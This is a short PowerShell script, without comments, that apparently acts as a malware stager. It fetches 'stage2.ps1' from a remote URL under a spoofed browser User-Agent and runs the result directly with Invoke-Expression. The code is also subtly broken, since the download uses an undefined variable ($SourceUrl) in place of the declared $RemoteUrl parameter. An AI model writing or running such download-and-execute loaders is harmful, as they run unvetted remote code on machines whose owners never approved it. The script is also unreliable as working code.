
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://adatum.com/stage2.ps1',
    [int]$StageTimeout = 24
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$RemoteScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $RemoteScript.Length)
Invoke-Expression $RemoteScript

Start-Sleep -Seconds 9
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
